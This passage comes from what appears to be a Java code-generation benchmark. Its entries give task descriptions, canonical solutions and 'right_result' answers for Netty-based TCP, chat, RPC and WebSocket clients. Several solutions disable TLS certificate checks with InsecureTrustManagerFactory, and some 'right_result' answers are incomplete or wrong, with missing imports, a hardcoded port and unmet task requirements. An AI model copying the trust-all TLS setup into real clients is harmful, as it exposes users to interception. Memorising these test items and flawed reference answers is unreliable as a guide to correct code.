    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class ObjectEchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoClientHandler());\n                }\n             });\n\n            b.connect(HOST, PORT).sync().channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class ObjectEchoClient {\n    private final boolean SSL;\n    private final String HOST;\n    private final int PORT;\n    private final int SIZE;\n\n    public ObjectEchoClient(boolean ssl, String host, int port, int size) {\n        this.SSL = ssl;\n        this.HOST = host;\n        this.PORT = port;\n        this.SIZE = size;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true);\n\n            if (SSL) {\n                SslContext sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                b.handler(new ChannelInitializer<NioSocketChannel>() {\n                    @Override\n                    protected void initChannel(NioSocketChannel ch) {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                        ch.pipeline().addLast(new ObjectEncoder());\n                        ch.pipeline().addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                        ch.pipeline().addLast(new ObjectEchoClientHandler());\n                    }\n                });\n            } else {\n                b.handler(new ChannelInitializer<NioSocketChannel>() {\n                    @Override\n                    protected void initChannel(NioSocketChannel ch) {\n                        ch.pipeline().addLast(new ObjectEncoder());\n                        ch.pipeline().addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                        ch.pipeline().addLast(new ObjectEchoClientHandler());\n                    }\n                });\n            }\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an encrypted connection to a server, sends messages from standard input, and gracefully shuts down when instructed.\n\nClass Description: SecureChatClient is a Netty-based client that handles secure TCP communication with a chat server. It manages connection lifecycle, message sending, and proper resource cleanup.\n\nAttributes:\n- HOST: [String] - The server host address (default: \"127.0.0.1\")\n- PORT: [int] - The server port number (default: 8992)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network connection\n- sslCtx: [SslContext] - SSL context for secure communication\n\nMethods:\n- SecureChatClient() -> [void] - Constructor that initializes SSL context and event loop group\n- connect() -> [void] - Establishes connection to the server using Bootstrap configuration\n- startChat() -> [void] - Starts interactive chat session reading from standard input and sending messages to server\n- shutdown() -> [void] - Gracefully shuts down the client and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() throws Exception {\n        this.sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void connect() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new SecureChatClientInitializer(sslCtx));\n\n        this.channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void startChat() throws Exception {\n        ChannelFuture lastWriteFuture = null;\n        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n        for (;;) {\n            String line = in.readLine();\n            if (line == null) {\n                break;\n            }\n\n            lastWriteFuture = channel.writeAndFlush(line + \"\\r\\n\");\n\n            if (\"bye\".equals(line.toLowerCase())) {\n                channel.closeFuture().sync();\n                break;\n            }\n        }\n\n        if (lastWriteFuture != null) {\n            lastWriteFuture.sync();\n        }\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\n\npublic class SecureChatClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8992;\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() throws Exception {\n        sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n        group = new NioEventLoopGroup();\n    }\n\n    public void connect() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                 p.addLast(new StringEncoder(StandardCharsets.UTF_8));\n             }\n         });\n\n        channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void startChat() throws Exception {\n        BufferedReader console = new BufferedReader(new InputStreamReader(System.in));\n\n        for (;;) {\n            String line = console.readLine();\n            if (line == null) {\n                break;\n            }\n\n            channel.writeAndFlush(line + \"\\r\\n\");\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        SecureChatClient client = new SecureChatClient();\n        try {\n            client.connect();\n            System.out.println(\"Connected to the server. Type messages and press Enter to send.\");\n            client.startChat();\n        } finally {\n            client.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, calculate factorials, and handle secure connections when required.\n\nClass Description: The FactorialClient class establishes a TCP connection to a specified server using Netty's non-blocking I/O. It supports optional SSL encryption and calculates factorials through server communication. The class manages connection lifecycle and resource cleanup.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes the Netty client, establishes connection, handles SSL if enabled, and calculates factorial. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints factorial result to stderr)\n  - Description: Creates event loop group, configures bootstrap with channel type and handler, connects to server, retrieves factorial result from handler, and ensures proper resource cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx = SSL ? SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE) : null;\n        EventLoopGroup group = new NioEventLoopGroup();\n        \n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            FactorialClientHandler handler = (FactorialClientHandler) f.channel().pipeline().last();\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class FactorialClient {\n    private final boolean SSL;\n    private final String HOST;\n    private final int PORT;\n    private final int COUNT;\n\n    public FactorialClient(boolean ssl, String host, int port, int count) {\n        this.SSL = ssl;\n        this.HOST = host;\n        this.PORT = port;\n        this.COUNT = count;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true);\n\n            if (SSL) {\n                SslContext sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                b.handler(new io.netty.channel.ChannelInitializer<NioSocketChannel>() {\n                    @Override\n                    protected void initChannel(NioSocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                        ch.pipeline().addLast(new StringEncoder());\n                        ch.pipeline().addLast(new FactorialClientHandler(COUNT));\n                    }\n                });\n            } else {\n                b.handler(new io.netty.channel.ChannelInitializer<NioSocketChannel>() {\n                    @Override\n                    protected void initChannel(NioSocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new StringEncoder());\n                        ch.pipeline().addLast(new FactorialClientHandler(COUNT));\n                    }\n                });\n            }\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    static class FactorialClientHandler extends SimpleChannelInboundHandler<String> {\n        private final int number;\n        private String result;\n\n        FactorialClientHandler(int number) {\n            this.number = number;\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.writeAndFlush(String.valueOf(number));\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            result = msg;\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        public String getResult() {\n            return result;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false;\n        String host = \"127.0.0.1\";\n        int port = 8322;\n        int count = 1000;\n        FactorialClient client = new FactorialClient(ssl, host, port, count);\n        client.start();\n    }\n}\n```"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for RPC communication, handling connection management, message sending, and resource cleanup.\n\nClass Description: NettyConnectClient is a TCP client implementation using Netty framework for RPC communication. It manages network connections, handles message encoding/decoding, and provides methods for connection validation and resource cleanup.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads and event processing\n- channel: [Channel] - Represents the active network connection to the server\n\nMethods:\n- init: [void]([String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory]) -> [void] - Initializes the client connection, sets up the pipeline with encoders/decoders, and establishes connection to the server\n- isValidate: [void]() -> [boolean] - Checks if the current connection is active and valid\n- close: [void]() -> [void] - Closes the active connection and releases all resources\n- send: [void]([XxlRpcRequest xxlRpcRequest]) -> [void] - Sends an RPC request through the established channel",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyDecoder;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyEncoder;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport com.wugui.datax.rpc.util.IpUtil;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyConnectClient thisClient = this;\n\n        Object[] array = IpUtil.parseIpPort(address);\n        String host = (String) array[0];\n        int port = (int) array[1];\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new NettyEncoder(XxlRpcRequest.class, serializer))\n                                .addLast(new NettyDecoder(XxlRpcResponse.class, serializer))\n                                .addLast(new NettyClientHandler(xxlRpcInvokerFactory, thisClient));\n                    }\n                })\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        this.channel.writeAndFlush(xxlRpcRequest).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\n\npublic class NettyConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private XxlRpcInvokerFactory xxlRpcInvokerFactory;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) {\n        this.serializer = serializer;\n        this.xxlRpcInvokerFactory = xxlRpcInvokerFactory;\n\n        group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(\"frameDecoder\", new LengthFieldBasedFrameDecoder(1024 * 1024, 0, 4, 0, 4));\n                            pipeline.addLast(\"frameEncoder\", new LengthFieldPrepender(4));\n                            pipeline.addLast(\"decoder\", new RpcRequestDecoder(serializer));\n                            pipeline.addLast(\"encoder\", new RpcResponseEncoder(serializer));\n                            pipeline.addLast(\"handler\", new ClientHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(address, 8080).sync();\n            if (future.isSuccess()) {\n                channel = future.channel();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        if (isValidate()) {\n            byte[] data = serializer.serialize(xxlRpcRequest);\n            channel.writeAndFlush(data);\n        }\n    }\n\n    private class ClientHandler extends SimpleChannelInboundHandler<byte[]> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, byte[] msg) throws Exception {\n            // Handle incoming response\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    private static class RpcRequestDecoder extends ByteToMessageDecoder {\n        private final Serializer serializer;\n\n        public RpcRequestDecoder(Serializer serializer) {\n            this.serializer = serializer;\n        }\n\n        @Override\n        protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n            if (in.readableBytes() < 4) {\n                return;\n            }\n            in.markReaderIndex();\n            int length = in.readInt();\n            if (in.readableBytes() < length) {\n                in.resetReaderIndex();\n                return;\n            }\n            byte[] data = new byte[length];\n            in.readBytes(data);\n            out.add(serializer.deserialize(data, XxlRpcRequest.class));\n        }\n    }\n\n    private static class RpcResponseEncoder extends MessageToByteEncoder<byte[]> {\n        private final Serializer serializer;\n\n        public RpcResponseEncoder(Serializer serializer) {\n            this.serializer = serializer;\n        }\n\n        @Override\n        protected void encode(ChannelHandlerContext ctx, byte[] msg, ByteBuf out) throws Exception {\n            out.writeInt(msg.length);\n            out.writeBytes(msg);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections, sending messages to a server, and handling console input.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, read console input, and gracefully shutdown the connection. It uses Netty's non-blocking I/O model for efficient network communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void]() -> [void] - Initializes the Netty client, connects to the specified server, and sets up the communication pipeline\n- sendMessage(): [void]([String message]) -> [void] - Converts the input string to a ByteBuf and sends it to the server through the established channel\n- startConsoleInput(): [void]() -> [void] - Starts reading input from the console and sends each line to the server (throws IOException)\n- shutdown(): [void]() -> [void] - Gracefully shuts down the client connection and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientChannelInitializer());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class EchoClient {\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new EchoClientHandler());\n                        }\n                    });\n\n            channel = bootstrap.connect(hostName, portNumber).sync().channel();\n            startConsoleInput();\n        } catch (InterruptedException | IOException e) {\n            shutdown();\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel != null && channel.isActive()) {\n            ByteBuf buffer = Unpooled.copiedBuffer(message.getBytes());\n            channel.writeAndFlush(buffer);\n        }\n    }\n\n    public void startConsoleInput() throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter messages to send to the server (type 'exit' to quit):\");\n        String line;\n        while ((line = in.readLine()) != null) {\n            if (\"exit\".equalsIgnoreCase(line)) {\n                break;\n            }\n            sendMessage(line);\n        }\n        shutdown();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class EchoClientHandler extends SimpleChannelInboundHandler<ByteBuf> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n            byte[] bytes = new byte[msg.readableBytes()];\n            msg.readBytes(bytes);\n            String response = new String(bytes);\n            System.out.println(\"Server response: \" + response);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Implement a Netty-based WebSocket client class that establishes and manages WebSocket connections, handles message sending/receiving, and provides connection status monitoring.\n\nClass Description: NettyWebSocket is a WebSocket client implementation using Netty framework that supports both WS and WSS protocols. It implements the ITransport interface for WebSocket communication, providing connection management, message transmission, and status checking capabilities.\n\nAttributes:\n- mChannel: Channel - The active Netty channel for WebSocket communication\n- mHandler: NettyWebSocketClientHandler - Custom handler for WebSocket events and messages\n- mGroup: NioEventLoopGroup - Netty event loop group for I/O operations\n- mUri: String - The WebSocket server URI to connect to\n- mOptions: WebSocketOptions - Configuration options for the WebSocket connection\n\nMethods:\n- connect(ITransportHandler transportHandler, TransportOptions options) -> void - Establishes a WebSocket connection to the specified URI. Initializes SSL context if needed, creates a handshaker, and sets up the Netty pipeline with necessary handlers.\n  Input: \n    - transportHandler: ITransportHandler - Callback handler for transport events\n    - options: TransportOptions - Connection-specific options\n  Output: None (throws Exception on failure)\n\n- send(byte[] payload, boolean isBinary) -> void - Sends data through the WebSocket connection as either binary or text frame.\n  Input:\n    - payload: byte[] - The data to send\n    - isBinary: boolean - Flag indicating binary (true) or text (false) format\n  Output: None\n\n- isOpen() -> boolean - Checks if the WebSocket connection is currently active.\n  Input: None\n  Output: boolean - True if connection is open, false otherwise\n\n- close() -> void - Closes the WebSocket connection gracefully and releases resources.\n  Input: None\n  Output: None (throws Exception on failure)\n\n- validateURIAndGetPort(URI uri) -> int - Validates the WebSocket URI and determines the appropriate port.\n  Input: uri: URI - The WebSocket URI to validate\n  Output: int - The port number to use\n\n- getSSLContext(String scheme) -> SslContext - Creates SSL context for WSS connections.\n  Input: scheme: String - The URI scheme (\"ws\" or \"wss\")\n  Output: SslContext - Configured SSL context or null for WS\n\n- toByteBuf(byte[] bytes) -> ByteBuf - Converts byte array to Netty ByteBuf.\n  Input: bytes: byte[] - Data to convert\n  Output: ByteBuf - Netty buffer containing the data",
    "Canonical_solution": "import java.net.URI;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.net.ssl.SSLException;\n\nimport io.crossbar.autobahn.wamp.interfaces.ITransport;\nimport io.crossbar.autobahn.wamp.interfaces.ITransportHandler;\nimport io.crossbar.autobahn.wamp.types.CloseDetails;\nimport io.crossbar.autobahn.wamp.types.TransportOptions;\nimport io.crossbar.autobahn.wamp.types.WebSocketOptions;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;\nimport 